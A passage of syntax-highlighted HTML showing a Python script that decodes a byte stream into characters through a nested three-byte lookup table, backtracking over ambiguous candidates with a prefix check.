</span><span class="n">zhelaosu</span> <span class="o">=</span> <span class="p">{}</span>

<span class="k">while</span> <span class="n">pointer</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="c1"># check prefix first
</span>    <span class="k">if</span> <span class="ow">not</span> <span class="n">check_prefix</span><span class="p">(</span><span class="n">res</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Error"</span><span class="p">)</span>
        <span class="k">assert</span> <span class="mi">0</span><span class="p">,</span> <span class="n">res</span>
    <span class="c1"># each iteration outputs a char
</span>    <span class="n">c1</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">pointer</span><span class="p">]</span>
    <span class="n">pointer</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="n">c2</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">pointer</span><span class="p">]</span> <span class="k">if</span> <span class="n">pointer</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="k">else</span> <span class="mi">0</span>
    <span class="n">pointer</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="n">c3</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">pointer</span><span class="p">]</span> <span class="k">if</span> <span class="n">pointer</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="k">else</span> <span class="mi">0</span>
    <span class="n">pointer</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">c1</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">c2</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">c3</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">mappings</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">c1</span><span class="p">)</span> <span class="ow">and</span> <span class="n">mappings</span><span class="p">[</span><span class="n">c1</span><span class="p">].</span><span class="n">get</span><span class="p">(</span><span class="n">c2</span><span class="p">)</span> <span class="ow">and</span> <span class="n">mappings</span><span class="p">[</span><span class="n">c1</span><span class="p">][</span><span class="n">c2</span><span class="p">].</span><span class="n">get</span><span class="p">(</span><span class="n">c3</span><span class="p">):</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="n">mappings</span><span class="p">[</span><span class="n">c1</span><span class="p">][</span><span class="n">c2</span><span class="p">][</span><span class="n">c3</span><span class="p">]</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="c1"># hard part here!
</span>
        <span class="c1"># retract pointer (c3 not used)
</span>        <span class="n">pointer</span> <span class="o">-=</span> <span class="mi">1</span>

        <span class="c1"># c1: we know that c1 can only be \xe?
</span>        <span class="k">if</span> <span class="n">c1</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">mappings</span><span class="p">:</span>
            <span class="n">candidates</span> <span class="o">=</span> <span class="p">[]</span>
            <span class="k">for</span> <span class="n">f1</span> <span class="ow">in</span> <span class="n">mappings</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">mappings</span><span class="p">[</span><span class="n">f1</span><span class="p">].</span><span class="n">get</span><span class="p">(</span><span class="n">c1</span><span class="p">)</span> <span class="ow">and</span> <span class="n">mappings</span><span class="p">[</span><span class="n">f1</span><span class="p">][</span><span class="n">c1</span><span class="p">].</span><span class="n">get</span><span class="p">(</span><span class="n">c2</span><span class="p">):</span>
                    <span class="n">candidates</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">mappings</span><span class="p">[</span><span class="n">f1</span><span class="p">][</span><span class="n">c1</span><span class="p">][</span><span class="n">c2</span><span class="p">])</span>
            <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">candidates</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span>
            <span class="n">res</span> <span class="o">+=</span> <span class="n">candidates</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">c1set</span> <span class="o">=</span> <span class="n">mappings</span><span class="p">[</span><span class="n">c1</span><span class="p">]</span>
            <span class="c1"># knowing that c1set[c2][c3] is not here...
</span>            <span class="c1"># 1. c1set[c2][?]
</span>            <span class="c1"># 2. c1set[?][c2]
</span>
            <span class="n">candidates</span> <span class="o">=</span> <span class="p">[]</span>
            <span class="k">if</span> <span class="n">c1set</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">c2</span><span class="p">):</span>
                <span class="k">for</span> <span class="n">f3</span> <span class="ow">in</span> <span class="n">c1set</span><span class="p">[</span><span class="n">c2</span><span class="p">]:</span>
                    <span class="n">candidates</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">c1set</span><span class="p">[</span><span class="n">c2</span><span class="p">][</span><span class="n">f3</span><span class="p">])</span>
            <span class="k">for</span> <span class="n">tmp</span> <span class="ow">in</span> <span class="n">c1set</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">c1set</span><span class="p">[</span><span class="n">tmp</span><span class="p">].</span><span class="n">get</span><span class="p">(</span><span class="n">c2</span><span class="p">):</span>
                    <span class="n">candidates</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">c1set</span><span class="p">[</span><span class="n">tmp</span><span class="p">][</span><span class="n">c2</span><span class="p">])</span>
            
            <span class="c1"># assert len(candidates) &gt; 0, res
</span>            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">candidates</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">"!!!"</span><span class="p">)</span>
                <span class="c1"># now we have too many candidates
</span>                <span class="k">for</span> <span class="n">tmp</span> <span class="ow">in</span> <span class="n">c1set</span><span class="p">:</span>
                    <span class="k">for</span> <span class="n">tmp2</span> <span class="ow">in</span> <span class="n">c1set</span><span class="p">[</span><span class="n">tmp</span><span class="p">]:</span>
                        <span class="n">candidates</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">c1set</span><span class="p">[</span><span class="n">tmp</span><span class="p">][</span><span class="n">tmp2</span><span class="p">])</span>
                <span class="c1"># c2 is not used
</span>                <span class="n">pointer</span> <span class="o">-=</span> <span class="mi">1</span>
            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">candidates</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
                <span class="n">res</span> <span class="o">+=</span> <span class="n">candidates</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="c1"># test each one
</span>                <span class="n">candidates_new</span> <span class="o">=</span> <span class="p">[]</span>
                <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">candidates</span><span class="p">:</span>
                    <span class="k">if</span> <span class="n">check_prefix</span><span class="p">(</span><span class="n">res</span> <span class="o">+</span> <span class="n">c</span><span class="p">):</span>
                        <span class="n">candidates_new</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
                <span class="c1"># assert len(candidates_new) == 1, (res, candidates_new)
</span>                <span class="k">print</span><span class="p">(</span><span class="n">candidates_new</span><span class="p">)</span>
                <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">candidates_new</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
                    <span class="n">res</span> <span class="o">+=</span> <span class="n">candidates_new</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="k">if</span> <span class="n">pointer</span> <span class="o">&gt;=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
                        <span class="n">flag</span> <span class="o">=</span> <span class="bp">False</span>
                        <span class="k">for</span> <span class="n">candidate</span> <span class="ow">in</span> <span class="n">candidates_new</span><span class="p">:</span>
                            <span class="k">if</span> <span class="n">check_prefix</span><span class="p">(</span><span class="n">res</span> <span class="o">+</span> <span class="n">candidate</span><span class="p">):</span>
                                <span class="n">flag</span> <span class="o">=</span> <span class="bp">True</span>
                                <span class="n">res</span> <span class="o">+=</span> <span class="n">candidate</span>
                                <span class="k">break</span>
                        <span class="k">if</span> <span class="ow">not</span> <span class="n">flag</span><span class="p">:</span>
                            <span class="k">assert</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">res</span><span class="p">,</span> <span class="n">candidates_new</span><span class="p">)</span>
                        <span class="k">else</span><span class="p">:</span>
                            <span class="k">break</span>
                    <span class="c1"># the most troublesome part is that we need to get next char
</span>                    <span class="n">possible_res</span> <span class="o">=</span> <span class="p">[]</span>
                    <span class="k">for</span> <span class="n">candidate</span> <span class="ow">in</span> <span class="n">candidates_new</span><span class="p">:</span>
                        <span class="n">cc1</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">pointer</span><span class="p">]</span>
                        <span class="n">pointer</span> <span class="o">+=</span> <span class="mi">1</span>
                        <span class="n">cc2</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">pointer</span><span class="p">]</span> <span class="k">if</span> <span class="n">pointer</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="k">else</span> <span class="mi">0</span>
                        <span class="n">pointer</span> <span class="o">+=</span> <span class="mi">1</span>
                        <span class="n">cc3</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">pointer</span><span class="p">]</span> <span class="k">if</span> <span class="n">pointer</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="k">else</span> <span class="mi">0</span>
                        <span class="n">pointer</span> <span class="o">+=</span> <span class="mi">1</span>
                        <span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">cc1</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">cc2</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">cc3</span><span class="p">))</span>
                        <span class="k">if</span> <span class="n">mappings</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">cc1</span><span class="p">)</span> <span class="ow">and</span> <span class="n">mappings</span><span class="p">[</span><span class="n">cc1</span><span class="p">].</span><span class="n">get</span><span class="p">(</span><span class="n">cc2</span><span class="p">)</span> <span class="ow">and</span> <span class="n">mappings</span><span class="p">[</span><span class="n">cc1</span><span class="p">][</span><span class="n">cc2</span><span class="p">].</span><span class="n">get</span><span class="p">(</span><span class="n">cc3</span><span class="p">):</span>
                            <span class="n">res</span> <span class="o">+=</span> <span class="n">candidate</span>
                            <span class="n">res</span> <span class="o">+=</span> <span class="n">mappings</span><span class="p">[</span><span class="n">cc1</span><span class="p">][</span><span class="n">cc2</span><span class="p">][</span><span class="n">cc3</span><span class="p">]</span>
                            <span class="c1"># print(res)
</span>                            <span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
                            <span class="k">if</span> <span class="n">check_prefix</span><span class="p">(</span><span class="n">res</span><span class="p">):</span>
                                <span class="n">possible_res</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">res</span><span class="p">[:],</span> <span class="mi">3</span><span class="p">))</span>
                            <span class="n">res</span> <span class="o">=</span> <span class="n">res</span><span class="p">[:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
                            <span class="n">pointer</span> <span class="o">-=</span> <span class="mi">3</span>
                        <span class="k">else</span><span class="p">:</span>
                            <span class="n">pointer</span> <span class="o">-=</span> <span class="mi">1</span>
                            <span class="c1"># repeating logic...
</span>                            <span class="n">cc1set</span> <span class="o">=</span> <span class="n">mappings</span><span class="p">[</span><span class="n">cc1</span><span class="p">]</span>
                            <span class="n">c_candidates</span> <span class="o">=</span> <span class="p">[]</span>
                            <span class="k">if</span> <span class="n">cc1set</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">cc2</span><span class="p">):</span>
                                <span class="k">for</span> <span class="n">f3</span> <span class="ow">in</span> <span class="n">cc1set</span><span class="p">[</span><span class="n">cc2</span><span class="p">]:</span>
                                    <span class="n">c_candidates</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">cc1set</span><span class="p">[</span><span class="n">cc2</span><span class="p">][</span><span class="n">f3</span><span class="p">])</span>
                            <span class="k">for</span> <span class="n">tmp</span> <span class="ow">in</span> <span class="n">cc1set</span><span class="p">:</span>
                                <span class="k">if</span> <span class="n">cc1set</span><span class="p">[</span><span class="n">tmp</span><span class="p">].</span><span class="n">get</span><span class="p">(</span><span class="n">cc2</span><span class="p">):</span>
                                    <span class="n">c_candidates</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">cc1set</span><span class="p">[</span><span class="n">tmp</span><span class="p">][</span><span class="n">cc2</span><span class="p">])</span>
                            <span class="k">print</span><span class="p">(</span><span class="n">c_candidates</span><span class="p">)</span>
                            <span class="c1"># anyway anyone possible let's just try!
</span>                            <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">c_candidates</span><span class="p">:</span>
                                <span class="n">res</span> <span class="o">+=</span> <span class="n">candidate</span>
                                <span class="n">res</span> <span class="o">+=</span> <span class="n">c</span>
                                <span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
                                <span class="k">if</span> <span class="n">check_prefix</span><span class="p">(</span><span class="n">res</span><span class="p">):</span>
                                    <span class="n">possible_res</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">res</span><span class="p">[:],</span> <span class="mi">2</span><span class="p">))</span>
                                <span class="n">res</span> <span class="o">=</span> <span class="n">res</span><span class="p">[:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
                            <span class="n">pointer</span> <span class="o">-=</span> <span class="mi">2</span>
                    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">possible_res</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span>
                    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">possible_res</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
                        <span class="c1"># happy ending finally
</span>                        <span class="n">res</span> <span class="o">=</span> <span class="n">possible_res</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
                        <span class="n">pointer</span> <span class="o">+=</span> <span class="n">possible_res</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>
                    <span class="k">else</span><span class="p">:</span>
                        <span class="c1"># f**k let's try all of them AGAIN!
</span>                        <span class="n">possible_res_2</span> <span class="o">=</span> <span class="p">[]</span>
                        <span class="k">for</span> <span class="n">possible</span> <span class="ow">in</span> <span class="n">possible_res</span><span class="p">:</span>
                            <span class="n">r</span> <span class="o">=</span> <span class="n">possible</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
                            <span class="n">pointer</span> <span class="o">+=</span> <span class="n">possible</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
                            <span class="n">cc1</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">pointer</span><span class="p">]</span>
                            <span class="n">pointer</span> <span class="o">+=</span> <span class="mi">1</span>
                            <span class="n">cc2</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">pointer</span><span class="p">]</span> <span class="k">if</span> <span class="n">pointer</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="k">else</span> <span class="mi">0</span>
                            <span class="n">pointer</span> <span class="o">+=</span> <span class="mi">1</span>
                            <span class="n">cc3</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">pointer</span><span class="p">]</span> <span class="k">if</span> <span class="n">pointer</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="k">else</span> <span class="mi">0</span>
                            <span class="n">pointer</span> <span class="o">+=</span> <span class="mi">1</span>
                            <span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">cc1</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">cc2</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">cc3</span><span class="p">))</span>
                            <span class="k">if</span> <span class="n">mappings</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">cc1</span><span class="p">)</span> <span class="ow">and</span> <span class="n">mappings</span><span class="p">[</span><span class="n">cc1</span><span class="p">].</span><span class="n">get</span><span class="p">(</span><span class="n">cc2</span><span class="p">)</span> <span class="ow">and</span> <span class="n">mappings</span><span class="p">[</span><span class="n">cc1</span><span class="p">][</span><span class="n">cc2</span><span class="p">].</span><span class="n">get</span><span class="p">(</span><span class="n">cc3</span><span class="p">):</span>
                                <span class="k">print</span><span class="p">(</span><span class="n">r</span> <span class="o">+</span> <span class="n">mappings</span><span class="p">[</span><span class="n">cc1</span><span class="p">][</span><span class="n">cc2</span><span class="p">][</span><span class="n">cc3</span><span class="p">])</span>
                                <span class="k">if</span> <span class="n">check_prefix</span><span class="p">(</span><span class="n">r</span> <span class="o">+</span> <span class="n">mappings</span><span class="p">[</span><span class="n">cc1</span><span class="p">][</span><span class="n">cc2</span><span class="p">][</span><span class="n">cc3</span><span class="p">]):</span>
                                    <span class="c1"># print("pass")
</span>                                    <span class="n">possible_res_2</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">r</span><span class="p">,</span> <span class="n">possible</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
                            <span class="k">else</span><span class="p">:</span>
                                <span class="c1"># assert 0
</span>                                <span class="c1"># ignore cc3
</span>                                <span class="n">cc1set</span> <span class="o">=</span> <span class="n">mappings</span><span class="p">[</span><span class="n">cc1</span><span class="p">]</span>
                                <span class="n">c_candidates</span> <span class="o">=</span> <span class="p">[]</span>
                                <span class="k">if</span> <span class="n">cc1set</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">cc2</span><span class="p">):</span>
                                    <span class="k">for</span> <span class="n">f3</span> <span class="ow">in</span> <span class="n">cc1set</span><span class="p">[</span><span class="n">cc2</span><span class="p">]:</span>
                                        <span class="n">c_candidates</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">cc1set</span><span class="p">[</span><span class="n">cc2</span><span class="p">][</span><span class="n">f3</span><span class="p">])</span>
                                <span class="k">for</span> <span class="n">tmp</span> <span class="ow">in</span> <span class="n">cc1set</span><span class="p">:</span>
                                    <span class="k">if</span> <span class="n">cc1set</span><span class="p">[</span><span class="n">tmp</span><span class="p">].</span><span class="n">get</span><span class="p">(</span><span class="n">cc2</span><span class="p">):</span>
                                        <span class="n">c_candidates</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">cc1set</span><span class="p">[</span><span class="n">tmp</span><span class="p">][</span><span class="n">cc2</span><span class="p">])</span>
                                <span class="k">print</span><span class="p">(</span><span class="n">c_candidates</span><span class="p">)</span>
                                <span class="n">c_candidates_checked</span> <span class="o">=</span> <span class="p">[]</span>
                                <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">c_candidates</span><span class="p">:</span>
                                    <span class="k">if</span> <span class="n">check_prefix</span><span class="p">(</span><span class="n">r</span> <span class="o">+</span> <span class="n">c</span><span class="p">):</span>
                                        <span class="n">c_candidates_checked</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
                                <span class="k">print</span><span class="p">(</span><span class="n">c_candidates_checked</span><span class="p">)</span>
                                <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">c_candidates_checked</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                                    <span class="c1"># not possible
</span>                                    <span class="k">pass</span>
                                <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">c_candidates_checked</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
                                    <span class="n">possible_res_2</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">r</span><span class="p">,</span> <span class="n">possible</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
                                <span class="k">else</span><span class="p">:</span>
                                    <span class="c1"># ok anyway it is still possible
</span>                                    <span class="n">possible_res_2</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">r</span><span class="p">,</span> <span class="n">possible</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
                                    <span class="c1"># assert 0, c_candidates_checked
</span>                            <span class="n">pointer</span> <span class="o">-=</span> <span class="mi">3</span>
                            <span class="n">pointer</span> <span class="o">-=</span> <span class="n">possible</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
                        <span class="c1"># assert len(possible_res_2) == 1, possible_res_2
</span>                        <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">possible_res_2</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span>
                        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">possible_res_2</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
                            <span class="n">res</span> <span class="o">=</span> <span class="n">possible_res_2</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
                            <span class="n">pointer</span> <span class="o">+=</span> <span class="n">possible_res_2</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>
                        <span class="k">else</span><span class="p">:</span>
                            <span class="c1"># f**k
</span>                            <span class="n">possible_res_3</span> <span class="o">=</span> <span class="p">[]</span>
                            <span class="k">for</span> <span class="n">possible</span> <span class="ow">in</span> <span class="n">possible_res_2</span><span class="p">:</span>
                                <span class="n">r</span> <span class="o">=</span> <span class="n">possible</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
                                <span class="n">pointer</span> <span class="o">+=</span> <span class="n">possible</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
                                <span class="n">cc1</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">pointer</span><span class="p">]</span>
                                <span class="n">pointer</span> <span class="o">+=</span> <span class="mi">1</span>
                                <span class="n">cc2</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">pointer</span><span class="p">]</span> <span class="k">if</span> <span class="n">pointer</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="k">else</span> <span class="mi">0</span>
                                <span class="n">pointer</span> <span class="o">+=</span> <span class="mi">1</span>
                                <span class="n">cc3</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">pointer</span><span class="p">]</span> <span class="k">if</span> <span class="n">pointer</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="k">else</span> <span class="mi">0</span>
                                <span class="n">pointer</span> <span class="o">+=</span> <span class="mi">1</span>
                                <span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">cc1</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">cc2</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">cc3</span><span class="p">))</span>
                                <span class="k">if</span> <span class="n">mappings</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">cc1</span><span class="p">)</span> <span class="ow">and</span> <span class="n">mappings</span><span class="p">[</span><span class="n">cc1</span><span class="p">].</span><span class="n">get</span><span class="p">(</span><span class="n">cc2</span><span class="p">)</span> <span class="ow">and</span> <span class="n">mappings</span><span class="p">[</span><span class="n">cc1</span><span class="p">][</span><span class="n">cc2</span><span class="p">].</span><span class="n">get</span><span class="p">(</span><span class="n">cc3</span><span class="p">):</span>
                                    <span class="k">print</span><span class="p">(</span><span class="n">r</span> <span class="o">+</span> <span class="n">mappings</span><span class="p">[</span><span class="n">cc1</span><span class="p">][</span><span class="n">cc2</span><span class="p">][</span><span class="n">cc3</span><span class="p">])</span>
                                    <span class="k">if</span> <span class="n">check_prefix</span><span class="p">(</span><span class="n">r</span> <span class="o">+</span> <span class="n">mappings</span><span class="p">[</span><span class="n">cc1</span><span class="p">][</span><span class="n">cc2</span><span class="p">][</span><span class="n">cc3</span><span class="p">]):</span>
                                        <span class="c1"># print("pass")
</span>                                        <span class="n">possible_res_3</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">r</span><span class="p">,</span> <span class="n">possible</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
                                <span class="k">else</span><span class="p">:</span>
                                    <span class="c1"># ignore cc3
</span>                                    <span class="n">cc1set</span> <span class="o">=</span> <span class="n">mappings</span><span class="p">[</span><span class="n">cc1</span><span class="p">]</span>
                                    <span class="n">c_candidates</span> <span class="o">=</span> <span class="p">[]</span>
                                    <span class="k">if</span> <span class="n">cc1set</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">cc2</span><span class="p">):</span>
                                        <span class="k">for</span> <span class="n">f3</span> <span class="ow">in</span> <span class="n">cc1set</span><span class="p">[</span><span class="n">cc2</span><span class="p">]:</span>
                                            <span class="n">c_candidates</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">cc1set</span><span class="p">[</span><span class="n">cc2</span><span class="p">][</span><span class="n">f3</span><span class="p">])</span>
                                    <span class="k">for</span> <span class="n">tmp</span> <span class="ow">in</span> <span class="n">cc1set</span><span class="p">:</span>
                                        <span class="k">if</span> <span class="n">cc1set</span><span class="p">[</span><span class="n">tmp</span><span class="p">].</span><span class="n">get</span><span class="p">(</span><span class="n">cc2</span><span class="p">):</span>
                                            <span class="n">c_candidates</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">cc1set</span><span class="p">[</span><span class="n">tmp</span><span class="p">][</span><span class="n">cc2</span><span class="p">])</span>
                                    <span class="n">c_candidates_checked</span> <span class="o">=</span> <span class="p">[]</span>
                                    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">c_candidates</span><span class="p">:</span>
                                        <span class="k">if</span> <span class="n">check_prefix</span><span class="p">(</span><span class="n">r</span> <span class="o">+</span> <span class="n">c</span><span class="p">):</span>
                                            <span class="n">c_candidates_checked</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
                                    <span class="k">print</span><span class="p">(</span><span class="n">c_candidates</span><span class="p">,</span> <span class="n">c_candidates_checked</span><span class="p">)</span>
                                    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">c_candidates_checked</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
                                        <span class="n">possible_res_3</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">r</span><span class="p">,</span> <span class="n">possible</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
                                    <span class="k">else</span><span class="p">:</span>
                                        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">c_candidates_checked</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                                            <span class="k">pass</span>
                                        <span class="k">else</span><span class="p">:</span>
                                            <span class="k">assert</span> <span class="mi">0</span><span class="p">,</span> <span class="n">c_candidates_checked</span>
                                <span class="n">pointer</span> <span class="o">-=</span> <span class="mi">3</span>
                                <span class="n">pointer</span> <span class="o">-=</span> <span class="n">possible</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
                            <span class="c1"># assert len(possible_res_3) == 1, possible_res_3
</span>                            <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">possible_res_3</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span>
                            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">possible_res_3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
                                <span class="n">res</span> <span class="o">=</span> <span class="n">possible_res_3</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
                                <span class="n">pointer</span> <span class="o">+=</span> <span class="n">possible_res_3</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>
                            <span class="k">else</span><span class="p">:</span>
                                <span class="k">print</span><span class="p">(</span><span class="s">"WARNING"</span><span class="p">)</span>
                                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"DUPLICATION (</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">possible_res_3</span><span class="p">)</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
                                <span class="k">print</span><span class="p">(</span><span class="n">possible_res_3</span><span class="p">)</span>
                                <span class="n">res</span> <span class="o">=</span> <span class="n">possible_res_3</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
                                <span class="n">pointer</span> <span class="o">+=</span> <span class="n">possible_res_3</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>

                                <span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="p">))</span>
                                <span class="k">print</span><span class="p">([</span><span class="n">i</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="o">-</span><span class="mi">10</span><span class="p">:]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">possible_res_3</span><span class="p">])</span>

